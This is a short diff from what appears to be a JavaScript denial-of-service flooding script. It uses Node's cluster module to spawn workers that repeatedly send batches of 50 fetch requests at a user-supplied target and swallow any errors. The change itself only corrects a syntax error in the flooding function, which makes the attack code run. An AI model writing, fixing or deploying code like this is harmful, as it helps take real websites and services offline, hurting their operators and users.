@@ -39,7 +39,7 @@ if (cluster.isMaster) {
 } else {
 	setInterval(bexFlooder);
 }
-function bexFlooder() = {
+function bexFlooder() {
 const IntervalAttack = setInterval(() => {
 for (let i = 0; i < 50; i++) {
     fetch(args.target).catch(error => {});
